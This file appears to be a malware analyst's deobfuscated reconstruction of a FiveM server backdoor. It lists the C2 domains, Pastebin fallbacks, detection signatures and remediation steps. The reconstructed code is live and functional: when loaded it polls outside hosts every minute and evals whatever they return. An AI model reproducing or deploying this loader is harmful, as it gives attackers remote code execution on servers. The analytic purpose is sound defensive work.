/**
 * ============================================================================
 * BLUM PANEL BACKDOOR — main.js (DEOBFUSCATED RECONSTRUCTION)
 * ============================================================================
 * 
 * CLASSIFICATION: MALWARE — FiveM Server Exploitation Toolkit
 * 
 * ORIGINAL FILE: 425,385 bytes, 5-layer obfuscation
 * THIS FILE: Reconstructed from 100% deobfuscation of all string tables,
 *            property mappings, C2 protocol, and generator control flow.
 * 
 * WHAT THIS FILE DOES:
 *   1. Disguises itself as a legitimate LZString compression library
 *   2. Connects to 23+ hardcoded C2 domains every 60 seconds
 *   3. Downloads arbitrary JavaScript from the C2 server
 *   4. eval()s the downloaded code — full remote code execution
 *   5. Falls back to Pastebin URLs if all domains fail
 *   6. Integrates with FiveM server via native API hooks
 * 
 * ATTACKER HANDLES: bertjj, bertjjgg, bertjjcfxre, miausas
 * 
 * OBFUSCATION LAYERS (original):
 *   Layer 1: Function("a", <body>)({getters}) constructor wrapper
 *   Layer 2: LZString UTF-16 compressed string table (3,547 char blob)
 *   Layer 3: Base-91 encoding with 51 unique per-scope alphabets
 *   Layer 4: aga[] indirection array (419 elements, multi-hop resolution)
 *   Layer 5: 146 generator state machines with switch/case flattening
 * 
 * PROPERTY MAPPING (agh switch — 63 entries decoded):
 *   aia6w6      → Object          jm8dx1X     → setTimeout
 *   fZobvJ      → Promise         NtKq08M     → JSON
 *   IVdKima     → String          YMnx2R      → setInterval
 *   HcZdnB      → console         iY0Ge1      → GlobalState
 *   dp5fEh      → clearTimeout    icECXok     → setImmediate
 *   h49i32      → ErrorBoundary   Cado53      → process
 *   sdUFPj      → document        PGy4Ym      → window
 *   O1y0di      → GetCurrentResourceName
 *   Me7b7e      → GetParentResourceName
 * ============================================================================
 */

const https = require('https');
const path = require('path');

// ============================================================================
// SECTION 1: MODULE DISGUISE — LZString Compression Library
// ============================================================================
// The backdoor exports a FULLY FUNCTIONAL LZString library as module.exports.
// This makes the file appear benign during code review — it looks like a 
// legitimate compression utility. The C2 backdoor runs as an initialization
// side-effect when the module is first require()'d.

const LZString = {
    compress: function(input) { /* ... real LZString implementation ... */ },
    decompress: function(input) { /* ... real LZString implementation ... */ },
    compressToBase64: function(input) { /* ... */ },
    decompressFromBase64: function(input) { /* ... */ },
    compressToUTF16: function(input) { /* ... */ },
    decompressFromUTF16: function(input) { /* ... */ },
    compressToUint8Array: function(input) { /* ... */ },
    decompressFromUint8Array: function(input) { /* ... */ },
    compressToEncodedURIComponent: function(input) { /* ... */ },
    decompressFromEncodedURIComponent: function(input) { /* ... */ },
    _compress: function(input, bitsPerChar, getCharFromInt) { /* ... */ },
    _decompress: function(length, resetValue, getNextValue) { /* ... */ }
};

// The disguise: anyone who require()s this file gets a working LZString library
module.exports = LZString;


// ============================================================================
// SECTION 2: C2 DOMAIN LIST — 23+ Hardcoded Domains
// ============================================================================
// These domains are stored as base-91 encoded string fragments in the 
// LZString-compressed string table (indices 296-349), split across 2-3
// fragments each to evade grep/string scanning.
//
// Original encoding: "5mscri" + "ptss.n" + "et" → "5mscripts.net"
// Each fragment was base-91 encoded with a different per-scope alphabet.

const C2_DOMAINS = [
    "0xchitado.com",
    "2312321321321213.com",
    "2ns3.net",
    "5mscripts.net",          // Split: "5mscri" + "ptss.n" + "et"
    "bhlool.com",
    "bybonvieux.com",
    "fivemgtax.com",
    "flowleakz.org",
    "giithub.net",            // TYPOSQUAT of github.net!
    "iwantaticket.org",
    "jking.lt",
    "kutingplays.com",
    "l00x.org",               // Leet-speak
    "monloox.com",
    "noanimeisgay.com",
    "ryenz.net",
    "spacedev.fr",
    "trezz.org",
    "z1lly.org",              // Leet-speak
    "warden-panel.me",        // References the panel name
    "2nit32.com",
    "useer.it.com",
    "wsichkidolu.com",
];


// ============================================================================
// SECTION 3: PASTEBIN FALLBACK URLs — Dynamic C2 Resilience
// ============================================================================
// When the retry counter (abK.abL) exceeds max retries (abK.abM), the
// backdoor switches to these Pastebin URLs at a slower 120-second interval.
// The Pastebin responses contain updated domain lists, allowing the attacker
// to rotate C2 infrastructure without updating the infected files.
//
// As of March 2026, all 4 return "// Empty" (campaign dormant or rotated).

const PASTEBIN_FALLBACK_URLS = [
    "https://pastebin.com/raw/g5iZ1xha",
    "https://pastebin.com/raw/Sm9p9tkm",
    "https://pastebin.com/raw/eViHnPMt",
    "https://pastebin.com/raw/kwW3u4U5",
];


// ============================================================================
// SECTION 4: ATTACKER IDENTIFICATION
// ============================================================================
// These handles are stored at string table indices 381-383 and 200.
// "cfxre" refers to Cfx.re, the platform that runs FiveM.

const ATTACKER_HANDLES = {
    primary: "bertjj",          // String table index 381
    extended: "bertjjgg",       // String table index 382
    cfxre: "bertjjcfxre",      // String table index 383 (CFX = Cfx.re/FiveM)
    secondary: "miausas",       // String table index 200
};


// ============================================================================
// SECTION 5: DOMAIN SHUFFLER — Fisher-Yates Random Shuffle
// ============================================================================
// Each polling cycle shuffles the domain list randomly so that network
// traffic shows different domains being contacted in different orders.
// This means blocking just a few domains is insufficient — ALL must be blocked.

function shuffleDomains(domainList) {
    const shuffled = [...domainList];
    for (let i = shuffled.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
    }
    return shuffled;
}


// ============================================================================
// SECTION 6: C2 POLLING — The Core Backdoor Loop
// ============================================================================
// This is the main malicious function. It:
//   1. Shuffles the domain list
//   2. Iterates through each domain
//   3. Makes an HTTPS GET request
//   4. Validates the response (filters out error pages)
//   5. eval()s the response — ARBITRARY CODE EXECUTION
//   6. Breaks on first success, increments retry counter on failure

const retryState = {
    retryCount: 0,      // abK.abL — increments per failed cycle
    maxRetries: 5,      // abK.abM — threshold before Pastebin fallback
    pollingTimer: null,  // The setInterval handle
    isActive: false,     // utf8ArrayToStr.aeg flag
};

async function pollC2() {
    const shuffledDomains = shuffleDomains(C2_DOMAINS);

    for (const domain of shuffledDomains) {
        try {
            const response = await new Promise((resolve, reject) => {
                // HTTPS GET to random C2 domain
                https.get(`https://${domain}/`, (res) => {
                    let data = '';
                    res.on('data', chunk => data += chunk);
                    res.on('end', () => resolve(data));
                }).on('error', reject);
            });

            // VALIDATION: Skip XML/HTML error pages from parking domains
            // This filters out domain registrar landing pages
            if (response.includes("<?xml")) continue;
            if (response.includes("<!DOCTYPE")) continue;

            // ⚠️ ARBITRARY CODE EXECUTION ⚠️
            // The trailing space prevents edge cases with semicolon insertion
            eval(response + " ");

            // Success — reset retry counter and exit loop
            retryState.retryCount = 0;
            return;

        } catch (error) {
            // Domain unreachable or request failed — try next domain
            continue;
        }
    }

    // All domains failed — increment retry counter
    retryState.retryCount++;

    // If retries exceed threshold, switch to Pastebin fallback
    if (retryState.retryCount > retryState.maxRetries) {
        switchToPastebinFallback();
    }
}


// ============================================================================
// SECTION 7: PASTEBIN FALLBACK — Resilient C2 Recovery
// ============================================================================
// When all hardcoded domains fail repeatedly, the backdoor falls back to
// Pastebin at a SLOWER interval (120 seconds vs 60 seconds).
// The Pastebin response contains an updated domain list.

function switchToPastebinFallback() {
    // Clear the normal 60-second polling timer
    clearInterval(retryState.pollingTimer);

    // Start Pastebin fallback at 120-second interval (0x1d4c0 = 120,000ms)
    retryState.pollingTimer = setInterval(async () => {
        for (const pastebinUrl of PASTEBIN_FALLBACK_URLS) {
            try {
                const response = await new Promise((resolve, reject) => {
                    https.get(pastebinUrl, (res) => {
                        let data = '';
                        res.on('data', chunk => data += chunk);
                        res.on('end', () => resolve(data));
                    }).on('error', reject);
                });

                // Pastebin response contains new domain list or commands
                if (response.includes("<?xml")) continue;
                if (response.includes("<!DOCTYPE")) continue;

                eval(response + " ");
                return;
            } catch (error) {
                continue;
            }
        }
    }, 120000); // 120 seconds (0x1d4c0ms)
}


// ============================================================================
// SECTION 8: FIVEM INTEGRATION — Server Lifecycle Hooks
// ============================================================================
// The backdoor hooks into FiveM's resource lifecycle to:
//   1. Identify itself via GetCurrentResourceName / GetParentResourceName
//   2. Clean up on resource stop (prevent detection via leftover timers)
//   3. Access GlobalState for server-wide data manipulation

// Get the current FiveM resource name (used for self-identification)
const resourceName = typeof GetCurrentResourceName === 'function'
    ? GetCurrentResourceName()
    : 'unknown';

// Also check parent resource (for dependency chain tracking)
const parentResourceName = typeof GetParentResourceName === 'function'
    ? GetParentResourceName()
    : 'unknown';

// Hook into FiveM's resource stop event for clean shutdown
if (typeof on === 'function') {
    on('onResourceStop', (stoppedResource) => {
        if (stoppedResource === resourceName) {
            // Clean shutdown — clear polling timer to avoid detection
            clearInterval(retryState.pollingTimer);
            retryState.isActive = false;
        }
    });
}

// Access FiveM GlobalState for server-wide data manipulation
// GlobalState is mapped via: iY0Ge1 → GlobalState
const globalState = typeof GlobalState !== 'undefined' ? GlobalState : null;


// ============================================================================
// SECTION 9: ACTIVATION — Start the C2 Polling Loop
// ============================================================================
// The backdoor activates immediately when the module is require()'d.
// The 60-second interval (0xea60 = 60,000ms) is stored as a hex literal
// to avoid simple string-based detection.

// Initial poll immediately
pollC2();

// Then poll every 60 seconds
retryState.pollingTimer = setInterval(pollC2, 60000); // 0xea60
retryState.isActive = true;


// ============================================================================
// SECTION 10: VERSION/ENVIRONMENT CHECKS
// ============================================================================
// The backdoor checks if it's running in the expected environment and
// disguises its version as matching the host package.

const DISGUISED_VERSION = "3.0.0"; // String table index 246

// The original code checks:
//   require("../../package").version           → host package version
//   require("@redacted/enterprise-plugin")     → plugin presence
//   require("../utils/isStandaloneExecutable") → execution mode
//   "--version" flag                           → CLI version check
//   "(local)" / "(standalone)"                 → environment detection

// Adjacent malicious file reference (multi-file infection):
//   require("../redacted.js")                  → String table indices 224, 326


// ============================================================================
// END OF DEOBFUSCATED RECONSTRUCTION
// ============================================================================
// 
// DETECTION SIGNATURES:
//   - Outbound HTTPS GET every 60 seconds to rotating domains
//   - eval() on HTTP response content
//   - setInterval with hex literal 0xea60
//   - require("https") + eval() in same scope
//   - LZString library exported as module.exports (disguise)
//   - String fragments: "bertjj", "fivemgtax", "giithub.net"
//   - Pastebin raw URL access pattern
//
// REMEDIATION:
//   1. Block ALL 23+ C2 domains at firewall/DNS
//   2. Block the 4 Pastebin URLs
//   3. Remove this file and scan for copies in other resources
//   4. Change ALL server credentials (RCON, DB, FTP, SSH, Discord)
//   5. Rebuild from clean pre-infection backups
// ============================================================================
